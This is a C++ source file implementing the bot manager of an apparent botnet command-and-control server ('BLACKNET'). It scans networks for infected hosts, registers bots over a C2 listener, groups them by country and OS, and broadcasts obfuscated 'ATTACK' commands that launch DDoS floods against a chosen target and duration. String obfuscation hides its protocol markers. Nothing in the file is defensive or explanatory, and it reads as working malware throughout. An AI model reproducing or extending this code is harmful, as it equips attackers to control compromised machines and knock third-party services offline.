#include "BotManager.h"
#include "Obfuscate.h"
#include <iostream>
#include <fstream>
#include <sstream>
#include <iomanip>
#include <ctime>
#include <cstring>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <ifaddrs.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <algorithm>
#include <random>
#include <csignal>

using namespace std;

BotManager::BotManager() : running(false), stopping(false), bot_timeout(60) {
    total_bots = 0;
    active_bots = 0;
    total_packets = 0;
    total_bytes = 0;
}

BotManager::~BotManager() {
    stop_ddos();
    running = false;
    if (c2_thread.joinable()) {
        c2_thread.detach();
    }
}

bool BotManager::add_bot(const string& ip, int port) {
    return add_bot(ip, port, false);
}

bool BotManager::add_bot(const string& ip, int port, bool skip_validate) {
    // Check if bot already exists
    for (const auto& bot : bots) {
        if (bot.ip == ip && bot.port == port) {
            return false;
        }
    }

    // Validate bot (unless skipped — used for simulated/imported bots)
    if (!skip_validate) {
        if (!validate_bot(ip, port)) {
            return false;
        }
    }
    
    Bot new_bot;
    new_bot.id = to_string(time(nullptr)) + "-" + ip;
    new_bot.ip = ip;
    new_bot.port = port;
    new_bot.version = "1.0";
    new_bot.os = "Unknown";
    new_bot.country = "Unknown";
    new_bot.last_seen = time(nullptr);
    new_bot.active = true;
    new_bot.packets_sent = 0;
    new_bot.bytes_sent = 0;
    
    lock_guard<mutex> lock(bots_mutex);
    bots.push_back(new_bot);
    total_bots++;
    active_bots++;
    
    return true;
}

bool BotManager::remove_bot(const string& id) {
    lock_guard<mutex> lock(bots_mutex);
    
    auto it = remove_if(bots.begin(), bots.end(),
        [&](const Bot& bot) {
            return bot.id == id;
        });
    
    if (it != bots.end()) {
        bots.erase(it, bots.end());
        total_bots--;
        if (active_bots > 0) active_bots--;
        
        cout << "[+] Bot removed: " << id << endl;
        return true;
    }
    
    return false;
}

bool BotManager::update_bot(const string& id, const string& ip, int port) {
    lock_guard<mutex> lock(bots_mutex);
    
    for (auto& bot : bots) {
        if (bot.id == id) {
            bot.ip = ip;
            bot.port = port;
            bot.last_seen = time(nullptr);
            return true;
        }
    }
    
    return false;
}

void BotManager::scan_network(const string& network, int port) {
    cout << "[+] Scanning network: " << network << ":" << port << endl;
    
    // Parse network (e.g., 192.168.1.0/24)
    size_t slash_pos = network.find('/');
    if (slash_pos == string::npos) {
        cerr << "[-] Invalid network format" << endl;
        return;
    }
    
    string base_ip = network.substr(0, slash_pos);
    int mask_bits = stoi(network.substr(slash_pos + 1));
    
    if (mask_bits < 0 || mask_bits > 32) {
        cerr << "[-] Invalid subnet mask" << endl;
        return;
    }
    
    // Calculate IP range
    struct in_addr network_addr;
    inet_pton(AF_INET, base_ip.c_str(), &network_addr);
    
    uint32_t network_ip = ntohl(network_addr.s_addr);
    uint32_t mask = 0xFFFFFFFF << (32 - mask_bits);
    uint32_t start_ip = network_ip & mask;
    uint32_t end_ip = start_ip | (~mask);
    
    // Start scanning in separate threads
    vector<thread> scan_threads;
    int threads = 10; // Number of concurrent scanners
    
    uint32_t range_size = end_ip - start_ip + 1;
    uint32_t chunk_size = range_size / threads;
    
    for (int i = 0; i < threads; i++) {
        uint32_t chunk_start = start_ip + (i * chunk_size);
        uint32_t chunk_end = (i == threads - 1) ? end_ip : chunk_start + chunk_size - 1;
        
        scan_threads.emplace_back([this, chunk_start, chunk_end, port]() {
            for (uint32_t ip = chunk_start; ip <= chunk_end && running; ip++) {
                struct in_addr addr;
                addr.s_addr = htonl(ip);
                
                char ip_str[INET_ADDRSTRLEN];
                inet_ntop(AF_INET, &addr, ip_str, INET_ADDRSTRLEN);
                
                // Skip network and broadcast addresses
                if (ip == chunk_start || ip == chunk_end) {
                    continue;
                }
                
                // Try to connect to bot port
                int sock = socket(AF_INET, SOCK_STREAM, 0);
                if (sock < 0) continue;
                
                struct sockaddr_in bot_addr;
                memset(&bot_addr, 0, sizeof(bot_addr));
                bot_addr.sin_family = AF_INET;
                bot_addr.sin_port = htons(port);
                bot_addr.sin_addr = addr;
                
                // Set timeout
                struct timeval timeout;
                timeout.tv_sec = 1;
                timeout.tv_usec = 0;
                setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
                setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
                
                // Try to connect
                if (connect(sock, (struct sockaddr*)&bot_addr, sizeof(bot_addr)) == 0) {
                    // Send bot handshake
                    string handshake = OBF("BOT_HANDSHAKE").decrypt();
                    send(sock, handshake.c_str(), handshake.length(), 0);
                    
                    // Receive response
                    char buffer[256];
                    ssize_t bytes = recv(sock, buffer, sizeof(buffer) - 1, 0);
                    if (bytes > 0) {
                        buffer[bytes] = '\0';
                        if (string(buffer) == OBF("BOT_ACK").decrypt()) {
                            // Valid bot found
                            add_bot(ip_str, port);
                        }
                    }
                }
                
                close(sock);
            }
        });
    }
    
    // Wait for all threads to complete
    for (auto& thread : scan_threads) {
        if (thread.joinable()) {
            thread.join();
        }
    }
    
    cout << "[+] Network scan complete. Found " << total_bots << " bots" << endl;
}

void BotManager::scan_range(const string& start_ip, const string& end_ip, int port) {
    cout << "[+] Scanning IP range: " << start_ip << " - " << end_ip << ":" << port << endl;
    
    struct in_addr start_addr, end_addr;
    inet_pton(AF_INET, start_ip.c_str(), &start_addr);
    inet_pton(AF_INET, end_ip.c_str(), &end_addr);
    
    uint32_t start = ntohl(start_addr.s_addr);
    uint32_t end = ntohl(end_addr.s_addr);
    
    if (start > end) {
        swap(start, end);
    }
    
    // Scan in chunks
    vector<thread> scan_threads;
    int threads = 10;
    uint32_t range_size = end - start + 1;
    uint32_t chunk_size = range_size / threads;
    
    for (int i = 0; i < threads; i++) {
        uint32_t chunk_start = start + (i * chunk_size);
        uint32_t chunk_end = (i == threads - 1) ? end : chunk_start + chunk_size - 1;
        
        scan_threads.emplace_back([this, chunk_start, chunk_end, port]() {
            for (uint32_t ip = chunk_start; ip <= chunk_end && running; ip++) {
                struct in_addr addr;
                addr.s_addr = htonl(ip);
                
                char ip_str[INET_ADDRSTRLEN];
                inet_ntop(AF_INET, &addr, ip_str, INET_ADDRSTRLEN);
                
                // Try to connect
                int sock = socket(AF_INET, SOCK_STREAM, 0);
                if (sock < 0) continue;
                
                struct sockaddr_in bot_addr;
                memset(&bot_addr, 0, sizeof(bot_addr));
                bot_addr.sin_family = AF_INET;
                bot_addr.sin_port = htons(port);
                bot_addr.sin_addr = addr;
                
                struct timeval timeout;
                timeout.tv_sec = 1;
                timeout.tv_usec = 0;
                setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
                setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
                
                if (connect(sock, (struct sockaddr*)&bot_addr, sizeof(bot_addr)) == 0) {
                    // Check if it's our bot
                    string handshake = OBF("BOT_IDENTIFY").decrypt();
                    send(sock, handshake.c_str(), handshake.length(), 0);
                    
                    char buffer[256];
                    ssize_t bytes = recv(sock, buffer, sizeof(buffer) - 1, 0);
                    if (bytes > 0) {
                        buffer[bytes] = '\0';
                        if (string(buffer).find(OBF("BLACKNET_BOT").decrypt()) != string::npos) {
                            add_bot(ip_str, port);
                        }
                    }
                }
                
                close(sock);
            }
        });
    }
    
    for (auto& thread : scan_threads) {
        if (thread.joinable()) {
            thread.join();
        }
    }
    
    cout << "[+] Range scan complete. Found " << total_bots << " bots" << endl;
}

bool BotManager::send_command(const Bot& bot, const string& command) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        return false;
    }
    
    struct sockaddr_in bot_addr;
    memset(&bot_addr, 0, sizeof(bot_addr));
    bot_addr.sin_family = AF_INET;
    bot_addr.sin_port = htons(bot.port);
    inet_pton(AF_INET, bot.ip.c_str(), &bot_addr.sin_addr);
    
    struct timeval timeout;
    timeout.tv_sec = 5;
    timeout.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
    
    if (connect(sock, (struct sockaddr*)&bot_addr, sizeof(bot_addr)) < 0) {
        close(sock);
        return false;
    }
    
    // Send command
    string full_command = command + "\n";
    ssize_t sent = send(sock, full_command.c_str(), full_command.length(), 0);
    
    close(sock);
    return sent > 0;
}

string BotManager::receive_response(const Bot& bot) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        return "";
    }
    
    struct sockaddr_in bot_addr;
    memset(&bot_addr, 0, sizeof(bot_addr));
    bot_addr.sin_family = AF_INET;
    bot_addr.sin_port = htons(bot.port);
    inet_pton(AF_INET, bot.ip.c_str(), &bot_addr.sin_addr);
    
    struct timeval timeout;
    timeout.tv_sec = 5;
    timeout.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
    
    if (connect(sock, (struct sockaddr*)&bot_addr, sizeof(bot_addr)) < 0) {
        close(sock);
        return "";
    }
    
    // Receive response
    char buffer[4096];
    ssize_t received = recv(sock, buffer, sizeof(buffer) - 1, 0);
    
    string response;
    if (received > 0) {
        buffer[received] = '\0';
        response = buffer;
    }
    
    close(sock);
    return response;
}

void BotManager::broadcast(const std::string& command) {
    lock_guard<mutex> lock(sockets_mutex);
    string cmd = command + "\n";
    vector<string> disconnected;
    for (auto& [ip, fd] : bot_sockets) {
        ssize_t n = send(fd, cmd.data(), cmd.size(), MSG_NOSIGNAL);
        if (n <= 0) {
            disconnected.push_back(ip);
        }
    }
    for (const auto& ip : disconnected) {
        close(bot_sockets[ip]);
        bot_sockets.erase(ip);
    }
}

bool BotManager::validate_bot(const string& ip, int port) {
    // Check if IP is banned
    if (banned_ips.find(ip) != banned_ips.end()) {
        return false;
    }
    
    // Try to connect and verify bot
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        return false;
    }
    
    struct sockaddr_in bot_addr;
    memset(&bot_addr, 0, sizeof(bot_addr));
    bot_addr.sin_family = AF_INET;
    bot_addr.sin_port = htons(port);
    inet_pton(AF_INET, ip.c_str(), &bot_addr.sin_addr);
    
    // Longer timeout for manual approval (--listen mode)
    struct timeval timeout;
    timeout.tv_sec = 60;
    timeout.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
    
    bool valid = false;
    if (connect(sock, (struct sockaddr*)&bot_addr, sizeof(bot_addr)) == 0) {
        // Send validation request with C2 port
        string validation = OBF("BLACKNET_VALIDATE").decrypt() + "\n" +
                           OBF("C2PORT:").decrypt() + to_string(c2_port) + "\n\n";
        send(sock, validation.c_str(), validation.length(), 0);
        
        // Receive validation response
        char buffer[256];
        ssize_t bytes = recv(sock, buffer, sizeof(buffer) - 1, 0);
        if (bytes > 0) {
            buffer[bytes] = '\0';
            string resp(buffer);
            if (resp.find(OBF("BLACKNET_BOT").decrypt()) != string::npos ||
                resp.find(OBF("BLACKNET_ACCEPTED").decrypt()) != string::npos) {
                valid = true;
            }
        }
    }
    
    close(sock);
    return valid;
}

void BotManager::send_command_to_all(const string& command) {
    lock_guard<mutex> lock(bots_mutex);
    
    vector<thread> command_threads;
    size_t bot_count = bots.size();

    for (size_t i = 0; i < bot_count; i++) {
        if (bots[i].active) {
            string bot_id = bots[i].id;
            command_threads.emplace_back([this, i, command, bot_id]() {
                if (bots[i].id == bot_id && send_command(bots[i], command)) {
                    bots[i].last_seen = time(nullptr);
                } else if (bots[i].id == bot_id) {
                    bots[i].active = false;
                }
            });
        }
    }

    for (auto& thread : command_threads) {
        if (thread.joinable()) {
            thread.join();
        }
    }
}

void BotManager::send_command_to_bot(const string& id, const string& command) {
    lock_guard<mutex> lock(bots_mutex);
    
    for (auto& bot : bots) {
        if (bot.id == id && bot.active) {
            if (send_command(bot, command)) {
                bot.last_seen = time(nullptr);
            } else {
                bot.active = false;
            }
            break;
        }
    }
}

void BotManager::send_command_to_country(const string& country, const string& command) {
    lock_guard<mutex> lock(bots_mutex);
    
    vector<thread> command_threads;
    size_t bot_count = bots.size();

    for (size_t i = 0; i < bot_count; i++) {
        if (bots[i].active && bots[i].country == country) {
            string bot_id = bots[i].id;
            command_threads.emplace_back([this, i, command, bot_id]() {
                if (bots[i].id == bot_id && send_command(bots[i], command)) {
                    bots[i].last_seen = time(nullptr);
                } else if (bots[i].id == bot_id) {
                    bots[i].active = false;
                }
            });
        }
    }
    
    for (auto& thread : command_threads) {
        if (thread.joinable()) {
            thread.join();
        }
    }
}

void BotManager::start_ddos(const string& target, int port, const string& method,
                           int duration, int intensity) {
    string command = OBF("ATTACK").decrypt() + " " + target + " " + to_string(port) + " " + 
                     method + " " + to_string(duration) + " " + to_string(intensity);
    
    int connected = 0;
    {
        lock_guard<mutex> lock(sockets_mutex);
        connected = bot_sockets.size();
    }
    cout << "[+] Starting DDoS via " << connected << " connected bots" << endl;
    
    stopping = false;
    
    broadcast(command);
    
    // Start monitoring thread
    thread monitor_thread([this, duration]() {
        if (duration > 0) {
            this_thread::sleep_for(chrono::seconds(duration));
            stop_ddos();
        }
    });
    monitor_thread.detach();
}

void BotManager::stop_ddos() {
    if (stopping.exchange(true)) return;
    cout << "[+] Stopping DDoS attack" << endl;
    broadcast(OBF("STOP").decrypt());
}

map<string, int> BotManager::get_bot_stats() {
    lock_guard<mutex> lock(bots_mutex);
    
    map<string, int> stats;
    stats["total_bots"] = total_bots.load();
    stats["active_bots"] = active_bots.load();
    stats["inactive_bots"] = total_bots.load() - active_bots.load();
    
    int total_packets_val = 0;
    int total_bytes_val = 0;
    
    for (const auto& bot : bots) {
        total_packets_val += bot.packets_sent;
        total_bytes_val += bot.bytes_sent;
    }
    
    stats["total_packets"] = total_packets_val;
    stats["total_bytes"] = total_bytes_val;
    
    return stats;
}

map<string, int> BotManager::get_country_stats() {
    lock_guard<mutex> lock(bots_mutex);
    
    map<string, int> country_stats;
    
    for (const auto& bot : bots) {
        country_stats[bot.country]++;
    }
    
    return country_stats;
}

map<string, int> BotManager::get_os_stats() {
    lock_guard<mutex> lock(bots_mutex);
    
    map<string, int> os_stats;
    
    for (const auto& bot : bots) {
        os_stats[bot.os]++;
    }
    
    return os_stats;
}

bool BotManager::save_bots(const string& filename) {
    lock_guard<mutex> lock(bots_mutex);

    ofstream file(filename);
    if (!file.is_open()) {
        cerr << "[-] Failed to save bots to: " << filename << endl;
        return false;
    }

    file << "[\n";
    for (size_t i = 0; i < bots.size(); i++) {
        const auto& b = bots[i];
        file << "  {\n";
        file << "    \"id\": \"" << b.id << "\",\n";
        file << "    \"ip\": \"" << b.ip << "\",\n";
        file << "    \"port\": " << b.port << ",\n";
        file << "    \"version\": \"" << b.version << "\",\n";
        file << "    \"os\": \"" << b.os << "\",\n";
        file << "    \"country\": \"" << b.country << "\",\n";
        file << "    \"active\": " << (b.active ? "true" : "false") << ",\n";
        file << "    \"packets_sent\": " << b.packets_sent << ",\n";
        file << "    \"bytes_sent\": " << b.bytes_sent << "\n";
        file << "  }";
        if (i < bots.size() - 1) file << ",";
        file << "\n";
    }
    file << "]\n";

    file.close();
    cout << "saved: " << bots.size() << " bots" << endl;
    return true;
}

bool BotManager::load_bots(const string& filename) {
    ifstream file(filename);
    if (!file.is_open()) {
        cerr << "[-] Failed to load bots from: " << filename << endl;
        return false;
    }

    stringstream ss;
    ss << file.rdbuf();
    string content = ss.str();
    file.close();

    int loaded = 0;
    size_t pos = 0;

    while ((pos = content.find("\"ip\":", pos)) != string::npos) {
        size_t ip_start = content.find('"', pos + 5) + 1;
        size_t ip_end = content.find('"', ip_start);
        string ip = content.substr(ip_start, ip_end - ip_start);

        size_t port_pos = content.find("\"port\":", ip_end);
        if (port_pos == string::npos) { pos = ip_end + 1; continue; }
        port_pos += 7;
        while (port_pos < content.size() && content[port_pos] == ' ') port_pos++;
        size_t port_end = content.find_first_of(",}\n", port_pos);
        int port = stoi(content.substr(port_pos, port_end - port_pos));

        // Check for duplicates
        bool dup = false;
        {
            lock_guard<mutex> lock(bots_mutex);
            for (const auto& b : bots) {
                if (b.ip == ip && b.port == port) { dup = true; break; }
            }
        }
        if (dup) { pos = port_end; continue; }

        // Parse optional fields
        string version = "1.0", os = "Unknown", country = "Unknown";
        string id = to_string(time(nullptr)) + "-" + ip;

        size_t id_pos = content.rfind("\"id\":\"", pos);
        if (id_pos != string::npos && id_pos < pos) {
            size_t id_s = content.find('"', id_pos + 5) + 1;
            size_t id_e = content.find('"', id_s);
            id = content.substr(id_s, id_e - id_s);
        }

        size_t ver_pos = content.rfind("\"version\":\"", pos);
        if (ver_pos != string::npos && ver_pos < pos) {
            size_t vs = content.find('"', ver_pos + 10) + 1;
            size_t ve = content.find('"', vs);
            version = content.substr(vs, ve - vs);
        }

        size_t os_pos = content.rfind("\"os\":\"", pos);
        if (os_pos != string::npos && os_pos < pos) {
            size_t os_s = content.find('"', os_pos + 5) + 1;
            size_t os_e = content.find('"', os_s);
            os = content.substr(os_s, os_e - os_s);
        }

        size_t co_pos = content.rfind("\"country\":\"", pos);
        if (co_pos != string::npos && co_pos < pos) {
            size_t cs = content.find('"', co_pos + 10) + 1;
            size_t ce = content.find('"', cs);
            country = content.substr(cs, ce - cs);
        }

        Bot bot;
        bot.id = id;
        bot.ip = ip;
        bot.port = port;
        bot.version = version;
        bot.os = os;
        bot.country = country;
        bot.last_seen = time(nullptr);
        bot.active = true;
        bot.packets_sent = 0;
        bot.bytes_sent = 0;

        {
            lock_guard<mutex> lock(bots_mutex);
            bots.push_back(bot);
            total_bots++;
            active_bots++;
        }
        loaded++;
        pos = port_end;
    }

    cout << "loaded: " << loaded << " bots" << endl;
    return loaded > 0;
}

int BotManager::bot_count() const {
    return total_bots.load();
}

int BotManager::active_bot_count() const {
    return active_bots.load();
}

int BotManager::connected_count() {
    lock_guard<mutex> lock(sockets_mutex);
    return bot_sockets.size();
}

void BotManager::set_c2_server(const string& server, int port) {
    c2_server = server;
    c2_port = port;
    
    if (c2_thread.joinable()) {
        running = false;
        c2_thread.detach();
    }
    
    running = true;
    c2_thread = thread(&BotManager::start_c2_server, this);
}

void BotManager::set_bot_timeout(int seconds) {
    bot_timeout = seconds;
}

vector<BotManager::Bot> BotManager::get_all_bots() {
    lock_guard<mutex> lock(bots_mutex);
    return bots;
}

vector<BotManager::Bot> BotManager::get_active_bots() {
    lock_guard<mutex> lock(bots_mutex);
    
    vector<Bot> active;
    for (const auto& bot : bots) {
        if (bot.active) {
            active.push_back(bot);
        }
    }
    
    return active;
}

vector<BotManager::Bot> BotManager::get_bots_by_country(const string& country) {
    lock_guard<mutex> lock(bots_mutex);
    
    vector<Bot> country_bots;
    for (const auto& bot : bots) {
        if (bot.country == country) {
            country_bots.push_back(bot);
        }
    }
    
    return country_bots;
}

void BotManager::start_c2_server() {
    // Block termination signals on this thread — main thread handles them
    sigset_t sigmask;
    sigemptyset(&sigmask);
    sigaddset(&sigmask, SIGINT);
    sigaddset(&sigmask, SIGTERM);
    pthread_sigmask(SIG_BLOCK, &sigmask, nullptr);

    int server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) {
        perror("[-] C2 server socket failed");
        return;
    }
    
    // Allow port reuse
    int opt = 1;
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    
    struct sockaddr_in address;
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(c2_port);
    
    if (bind(server_fd, (struct sockaddr*)&address, sizeof(address)) < 0) {
        perror("[-] C2 server bind failed");
        close(server_fd);
        return;
    }
    
    if (listen(server_fd, 10) < 0) {
        perror("[-] C2 server listen failed");
        close(server_fd);
        return;
    }
    
    cout << "[+] C2 server started on port " << c2_port << endl;
    
    while (running) {
        struct sockaddr_in client_addr;
        socklen_t client_len = sizeof(client_addr);
        
        int client_socket = accept(server_fd, (struct sockaddr*)&client_addr, &client_len);
        if (client_socket < 0) {
            continue;
        }
        
        char client_ip[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &client_addr.sin_addr, client_ip, INET_ADDRSTRLEN);
        
        // Handle client in separate thread
        thread client_thread(&BotManager::handle_bot_connection, this, client_socket, string(client_ip));
        client_thread.detach();
    }
    
    close(server_fd);
}

void BotManager::handle_bot_connection(int client_socket, const string& client_ip) {
    // Block termination signals on this thread
    sigset_t sigmask;
    sigemptyset(&sigmask);
    sigaddset(&sigmask, SIGINT);
    sigaddset(&sigmask, SIGTERM);
    pthread_sigmask(SIG_BLOCK, &sigmask, nullptr);

    char buffer[4096];
    ssize_t bytes_received;
    
    // Receive bot identification
    bytes_received = recv(client_socket, buffer, sizeof(buffer) - 1, 0);
    if (bytes_received <= 0) {
        close(client_socket);
        return;
    }
    
    buffer[bytes_received] = '\0';
    string request(buffer);
    
    if (request.find(OBF("BLACKNET_BOT").decrypt()) != string::npos) {
        // Bot connected
        cout << "[+] Bot connected: " << client_ip << endl;
        
        // Extract bot info
        string version = "1.0";
        string os = "Unknown";
        string country = "Unknown";
        int bot_port = 80; // default bot listener port

        size_t ver_pos = request.find(OBF("VERSION:").decrypt());
        if (ver_pos != string::npos) {
            size_t end_pos = request.find("\n", ver_pos);
            if (end_pos != string::npos) {
                string v = request.substr(ver_pos + 8, end_pos - ver_pos - 8);
                if (!v.empty()) version = v;
            }
        }

        size_t os_pos = request.find(OBF("OS:").decrypt());
        if (os_pos != string::npos) {
            size_t end_pos = request.find("\n", os_pos);
            if (end_pos != string::npos) {
                string o = request.substr(os_pos + 3, end_pos - os_pos - 3);
                if (!o.empty()) os = o;
            }
        }

        size_t port_pos = request.find(OBF("PORT:").decrypt());
        if (port_pos != string::npos) {
            size_t end_pos = request.find("\n", port_pos);
            if (end_pos != string::npos) {
                string p = request.substr(port_pos + 5, end_pos - port_pos - 5);
                if (!p.empty()) bot_port = stoi(p);
            }
        }
        
        // Add bot to list
        Bot bot;
        bot.id = to_string(time(nullptr)) + "-" + client_ip;
        bot.ip = client_ip;
        bot.port = bot_port;
        bot.version = version;
        bot.os = os;
        bot.country = country;
        bot.last_seen = time(nullptr);
        bot.active = true;
        bot.packets_sent = 0;
        bot.bytes_sent = 0;
        
        {
            lock_guard<mutex> lock(bots_mutex);
            bots.push_back(bot);
            total_bots++;
            active_bots++;
        }
        
        // Send acknowledgment
        string response = OBF("BLACKNET_ACK").decrypt() + "\n";
        send(client_socket, response.c_str(), response.length(), 0);

        // Register this socket for command broadcasting
        {
            lock_guard<mutex> lock(sockets_mutex);
            bot_sockets[client_ip] = client_socket;
        }

        // Handle bot commands
        while (running) {
            bytes_received = recv(client_socket, buffer, sizeof(buffer) - 1, 0);
            if (bytes_received <= 0) {
                break;
            }
            
            buffer[bytes_received] = '\0';
            string command(buffer);
            
            // Process command
            if (command.find(OBF("STATS").decrypt()) != string::npos) {
                // Update bot statistics
                lock_guard<mutex> lock(bots_mutex);
                for (auto& b : bots) {
                    if (b.ip == client_ip) {
                        size_t packets_pos = command.find(OBF("PACKETS:").decrypt());
                        size_t bytes_pos = command.find(OBF("BYTES:").decrypt());
                        
                        if (packets_pos != string::npos && bytes_pos != string::npos) {
                            string packets_str = command.substr(packets_pos + 8, bytes_pos - packets_pos - 8);
                            string bytes_str = command.substr(bytes_pos + 6);
                            
                            b.packets_sent = stoi(packets_str);
                            b.bytes_sent = stoi(bytes_str);
                            b.last_seen = time(nullptr);
                            
                            total_packets += b.packets_sent;
                            total_bytes += b.bytes_sent;
                        }
                        break;
                    }
                }
            } else if (command.find(OBF("PING").decrypt()) != string::npos) {
                // Update last seen
                lock_guard<mutex> lock(bots_mutex);
                for (auto& b : bots) {
                    if (b.ip == client_ip) {
                        b.last_seen = time(nullptr);
                        break;
                    }
                }
                
                send(client_socket, (OBF("PONG").decrypt() + "\n").c_str(), 5, 0);
            }
        }
        
        // Bot disconnected
        {
            lock_guard<mutex> lock(sockets_mutex);
            bot_sockets.erase(client_ip);
        }
        {
            lock_guard<mutex> lock(bots_mutex);
            for (auto& b : bots) {
                if (b.ip == client_ip) {
                    b.active = false;
                    active_bots--;
                    break;
                }
            }
        }
        
        cout << "[-] Bot disconnected: " << client_ip << endl;
    }
    
    close(client_socket);
}
